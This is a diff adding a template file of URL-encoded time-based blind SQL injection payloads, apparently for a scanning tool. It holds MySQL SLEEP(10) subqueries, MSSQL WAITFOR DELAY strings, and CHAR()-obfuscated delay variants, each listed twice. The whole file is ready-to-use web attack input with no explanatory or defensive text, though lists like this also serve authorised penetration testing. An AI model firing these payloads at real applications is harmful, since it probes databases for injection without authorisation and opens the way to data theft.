@@ -1,0 +1,27 @@
+;template file for SqlInjection payload
+;comments start with semicolon
+;payloads should be added line by line
+%20and%201%20in%20(select%20SLEEP(10))
+%20and%201%20in%20(select%20SLEEP(10))
+1'%20and%201%20in%20(select%20SLEEP(10))
+1'%20and%201%20in%20(select%20SLEEP(10))
+'and%201%20in%20(select%20SLEEP(10))%20and%201%20like'%25
+'and%201%20in%20(select%20SLEEP(10))%20and%201%20like'%25
+%20or%201%20in%20(select%20SLEEP(10))
+%20or%201%20in%20(select%20SLEEP(10))
+1'%20or%201%20in%20(select%20SLEEP(10))
+1'%20or%201%20in%20(select%20SLEEP(10))
+'or%201%20in%20(select%20SLEEP(10))%20and%201%20like'%25
+'or%201%20in%20(select%20SLEEP(10))%20and%201%20like'%25
+;waitfor%20delay%20'0:0:10'--%20
+;waitfor%20delay%20'0:0:10'--%20
+';waitfor%20delay%20'0:0:10'--
+';waitfor%20delay%20'0:0:10'--
+1';waitfor%20delay%20'0:0:10'--
+1';waitfor%20delay%20'0:0:10'--
+;DECLARE%20@T%20CHAR(6);SELECT%20@T%20=%20CHAR(48)%2bChar(58)%2bCHAR(48)%2bCHAR(58)%2bCHAR(48)%2bCHAR(50);WAITFOR%20DELAY%20@T--%20
+;DECLARE%20@T%20CHAR(6);SELECT%20@T%20=%20CHAR(48)%2bChar(58)%2bCHAR(48)%2bCHAR(58)%2bCHAR(48)%2bCHAR(52);WAITFOR%20DELAY%20@T--%20
+';DECLARE%20@T%20CHAR(6);SELECT%20@T%20=%20CHAR(48)%2bChar(58)%2bCHAR(48)%2bCHAR(58)%2bCHAR(48)%2bCHAR(50);WAITFOR%20DELAY%20@T--
+';DECLARE%20@T%20CHAR(6);SELECT%20@T%20=%20CHAR(48)%2bChar(58)%2bCHAR(48)%2bCHAR(58)%2bCHAR(48)%2bCHAR(52);WAITFOR%20DELAY%20@T--
+1';DECLARE%20@T%20CHAR(6);SELECT%20@T%20=%20CHAR(48)%2bChar(58)%2bCHAR(48)%2bCHAR(58)%2bCHAR(48)%2bCHAR(50);WAITFOR%20DELAY%20@T--
+1';DECLARE%20@T%20CHAR(6);SELECT%20@T%20=%20CHAR(48)%2bChar(58)%2bCHAR(48)%2bCHAR(58)%2bCHAR(48)%2bCHAR(52);WAITFOR%20DELAY%20@T--
